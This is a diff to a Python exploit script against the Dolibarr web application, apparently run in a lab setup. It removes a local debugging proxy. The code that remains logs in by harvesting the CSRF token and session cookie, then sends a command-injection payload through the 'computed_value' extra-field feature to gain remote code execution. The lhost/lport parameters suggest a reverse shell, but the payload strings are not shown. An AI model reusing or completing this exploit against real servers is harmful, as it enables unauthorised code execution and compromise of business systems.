@@ -16,11 +16,9 @@ def login(lhost, lport):
     Grab session cookie and CSRF token, log in, and return updated cookies and token.
     """
     try:
-        proxy = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
-
         # Step 1: Get initial CSRF token and cookie
         print("[*] Getting initial session and CSRF token...")
-        initial_res = requests.get("http://dolibarr:80/dolibarr/", proxies=proxy)
+        initial_res = requests.get("http://dolibarr:80/dolibarr/")
 
         set_cookie_header = initial_res.headers.get('Set-Cookie')
         cookie = SimpleCookie()
@@ -56,7 +54,7 @@ def login(lhost, lport):
             "screenheight": "815"
         }
 
-        login_res = requests.post(login_url, headers=headers, cookies=cookies, data=data, proxies=proxy)
+        login_res = requests.post(login_url, headers=headers, cookies=cookies, data=data)
         print("[+] Logged in successfully.")
 
         # Get new CSRF token after login
@@ -75,7 +73,6 @@ def rce(lhost, lport, cookies, csrf_token):
     Send command injection payload via vulnerable computed_value.
     """
     try:
-        proxy = {"http": "http://127.0.0.1:8080", "https": "https://127.0.0.1:8080"}
         cookie_name, cookie_value = list(cookies.items())[0]
 
         # Step 1: Add new extra field with simple command (whoami)
@@ -107,7 +104,7 @@ def rce(lhost, lport, cookies, csrf_token):
             "help": '',
             "button": "Save"
         }
-        res1 = requests.post(add_url, headers=headers, cookies=cookies, data=add_data, proxies=proxy)
+        res1 = requests.post(add_url, headers=headers, cookies=cookies, data=add_data)
         print("[+] Initial payload sent.")
 
         # Step 2: Extract updated CSRF token
@@ -146,7 +143,7 @@ def rce(lhost, lport, cookies, csrf_token):
             "help": '',
             "button": "Save"
         }
-        res2 = requests.post(rce_url, headers=rce_headers, cookies=cookies, data=rce_data, proxies=proxy)
+        res2 = requests.post(rce_url, headers=rce_headers, cookies=cookies, data=rce_data)
         print("[+] RCE payload sent.")
 
     except Exception as e:
